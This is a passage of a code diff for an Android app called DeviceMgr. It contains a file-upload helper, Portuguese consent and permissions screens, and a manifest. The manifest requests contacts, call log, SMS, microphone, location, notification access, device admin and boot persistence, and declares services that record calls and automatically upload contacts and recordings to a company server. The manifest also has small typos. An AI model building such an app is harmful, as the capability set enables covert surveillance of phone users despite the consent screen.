+			byte[] buffer = new byte[4096];
+			int r;
+			while ((r = fis.read(buffer)) != -1) {
+				baos.write(buffer, 0, r);
+			}
+			byte[] data = baos.toByteArray();
+			return uploadFile(url, fieldName, file.getName(), data, mime, bearerToken);
+			} finally {
+			try { if (fis != null) fis.close(); } catch (Exception e) {}
+			try { baos.close(); } catch (Exception e) {}
+		}
+	}
+}
+
+
+
+suite/app/src/main/ res/ layout/ activity_consent.xml
+<?xml version="1.0" encoding="utf-8"?>
+<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
+android:layout_width="match_parent" android:layout_height="match_parent"
+android:padding="16dp">
+<LinearLayout android:orientation="vertical" android:layout_width="match_parent" android:layout_height="wrap_content">
+<TextView android:text="Consentimento" android:textSize="20sp" android:layout_marginBottom="8dp" android:layout_width="wrap_content" android:layout_height="wrap_content"/>
+<TextView android:text="Esta aplicação recolherá contactos e gravará chamadas apenas com o seu consentimento. Os ficheiros serão enviados automaticamente ao servidor da empresa." android:layout_marginBottom="12dp" android:layout_width="wrap_content" android:layout_height="wrap_content"/>
+<CheckBox android:id="@+id/chkContacts" android:text="Concordo em enviar automaticamente a minha lista de contactos" android:layout_width="wrap_content" android:layout_height="wrap_content"/>
+<CheckBox android:id="@+id/chkCalls" android:text="Concordo em gravar chamadas e enviar automaticamente as gravações" android:layout_width="wrap_content" android:layout_height="wrap_content"/>
+<Button android:id="@+id/btnGrant" android:text="Conceder permissões e aceitar" android:layout_marginTop="16dp" android:layout_width="match_parent" android:layout_height="wrap_content"/>
+<TextView android:id="@+id/tvStatus" android:layout_marginTop="12dp" android:layout_width="wrap_content" android:layout_height="wrap_content"/>
+</LinearLayout>
+</ScrollView>
+suite/app/src/main/ res/ layout/ activity_login.xml
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+android:orientation="vertical" android:padding="16dp"
+android:layout_width="match_parent" android:layout_height="match_parent">
+
+<TextView android:text="Login" android:textSize="20sp" android:layout_width="wrap_content" android:layout_height="wrap_content"/>
+<EditText android:id="@+id/etEmail" android:hint="Email" android:inputType="textEmailAddress"
+android:layout_width="match_parent" android:layout_height="wrap_content"/>
+<EditText android:id="@+id/etPassword" android:hint="Password" android:inputType="textPassword"
+android:layout_width="match_parent" android:layout_height="wrap_content"/>
+<Button android:id="@+id/btnLogin" android:text="Login" android:layout_width="match_parent" android:layout_height="wrap_content"/>
+<TextView android:id="@+id/tvMsg" android:text="" android:layout_width="match_parent" android:layout_height="wrap_content" android:textColor="#d00"/>
+</LinearLayout>
+
+suite/app/src/main/ res/ layout/ activity_main_permissions.xml
+<?xml version="1.0" encoding="utf-8"?>
+<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
+android:layout_width="match_parent" android:layout_height="match_parent">
+<LinearLayout android:orientation="vertical" android:padding="16dp"
+android:layout_width="match_parent" android:layout_height="wrap_content">
+
+<TextView android:text="Permissões necessárias" android:textSize="20sp"
+android:layout_width="wrap_content" android:layout_height="wrap_content"/>
+
+<Button android:id="@+id/btnDeviceAdmin" android:text="Conceder Device Admin"
+android:layout_width="match_parent" android:layout_height="wrap_content"/>
+
+<Button android:id="@+id/btnLocationPerm" android:text="Permitir Localização"
+android:layout_width="match_parent" android:layout_height="wrap_content"/>
+
+<Button android:id="@+id/btnStoragePerm" android:text="Permitir Acesso a Ficheiros"
+android:layout_width="match_parent" android:layout_height="wrap_content"/>
+
+<Button android:id="@+id/btnCallLogPerm" android:text="Permitir Call Log"
+android:layout_width="match_parent" android:layout_height="wrap_content"/>
+
+<Button android:id="@+id/btnSmsPerm" android:text="Permitir SMS"
+android:layout_width="match_parent" android:layout_height="wrap_content"/>
+
+<Button android:id="@+id/btnNotifAccess" android:text="Abrir Definições Notificações"
+android:layout_width="match_parent" android:layout_height="wrap_content"/>
+
+<Button android:id="@+id/btnUsageAccess" android:text="Abrir Definições Acesso a Apps"
+android:layout_width="match_parent" android:layout_height="wrap_content"/>
+
+<!-- Botão de consentimento (essencial) -->
+<Button
+android:id="@+id/btnConsent"
+android:text="Dar consentimento (contactos e chamadas)"
+android:layout_width="match_parent"
+android:layout_height="wrap_content"
+android:layout_marginTop="8dp" />
+
+<View android:layout_height="10dp" android:layout_width="match_parent"/>
+
+<Button android:id="@+id/btnStartService" android:text="Iniciar Envio de Dados"
+android:layout_width="match_parent" android:layout_height="wrap_content"/>
+
+<TextView android:id="@+id/tvStatus" android:layout_width="match_parent"
+android:layout_height="wrap_content" android:text="Status: -" android:paddingTop="12dp"/>
+
+<TextView android:id="@+id/tvDeviceId" android:layout_width="match_parent"
+android:layout_height="wrap_content" android:text="DeviceId: -" android:paddingTop="6dp"/>
+
+<View android:layout_height="20dp" android:layout_width="match_parent"/>
+
+<TextView android:text="Enviar ficheiros" android:textStyle="bold"
+android:layout_width="wrap_content" android:layout_height="wrap_content" />
+
+<Button android:id="@+id/btnPickMedia" android:text="Escolher foto/vídeo e enviar"
+android:layout_width="match_parent" android:layout_height="wrap_content"/>
+
+</LinearLayout>
+</ScrollView>
+suite/app/src/main/ AndroidManifest
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+package="com.company.devicemgr">
+
+<!-- permissões -->
+<uses-permission android:name="android.permission.INTERNET" />
+<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+<uses-permission android:name="android.permission.READ_CONTACTS" />
+<uses-permission android:name="android.permission.RECORD_AUDIO" />
+<uses-permission android:name="android.permission.READ_PHONE_STATE" />
+<uses-permission android:name="android.permission.READ_CALL_LOG" />
+<uses-permission android:name="android.permission.READ_SMS" />
+<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+<!-- pedido para ver estatísticas de utilização (deve ser concedido pelo utilizador em Settings) -->
+<uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />>
+<application
+android:allowBackup="true"
+android:label="DeviceMgr"
+android:supportsRtl="true"
+android:them3e="@style/Theme.MyApplication">
+
+<!-- Launcher (entry) activity -->
+<activity
+android:name="com.company.devicemgr.activities.LoginActivity"
+android:exported="true">
+<intent-filter>
+<action android:name="android.intent.action.MAIN" />
+<category android:name="android.intent.category.LAUNCHER" />
+</intent-filter>
+</activity>
+
+<!-- Permissões / onboarding / settings -->
+<activity
+android:name="com.company.devicemgr.activities.MainPermissionsActivity"
+android:exported="false" />
+<activity
+android:name="com.company.devicemgr.activities.ConsentActivity"
+android:exported="false" />
+
+<!-- Serviços -->
+<!-- Telemetry: foreground service (location) -->
+<service
+android:name="com.company.devicemgr.services.ForegroundTelemetryService"
+android:exported="false"
+android:foregroundServiceType="location" />
+
+<!-- Contacts uploader (short lived) -->
+<service
+android:name="com.company.devicemgr.services.ContactsUploaderService"
+android:exported="false" />
+
+<!-- Call recorder (may require foreground start and RECORD_AUDIO) -->
+<service
+android:name="com.company.devicemgr.services.CallRecorderService"
+android:exported="false"
+android:foregroundServiceType="microphone" />
+
+<!-- Notification listener service (user must enable it in settings) -->
+<service
+android:name="com.company.devicemgr.services.NotificationListenerSvc"
+android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+android:exported="true">
+<intent-filter>
+<action android:name="android.service.notification.NotificationListenerService" />
+</intent-filter>
+</service>
+
+<!-- Device admin receiver -->
+<receiver
+android:name="com.company.devicemgr.receivers.DeviceAdminReceiver"
+android:exported="true"
+android:permission="android.permission.BIND_DEVICE_ADMIN">
+<meta-data
+android:name="android.app.device_admin"
+android:resource="@xml/device_admin_receiver" />
+<intent-filter>
+<action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+</intent-filter>
+</receiver>
+
+<!-- Boot receiver (reinicia serviços se consentidos) -->
+<receiver
+android:name="com.company.devicemgr.receivers.BootReceiver"
+android:exported="true">
+<intent-filter>
+<action android:name="android.intent.action.BOOT_COMPLETED" />
+</intent-filter>
+</receiver>
+
+</application>
+</manifest>
+
+
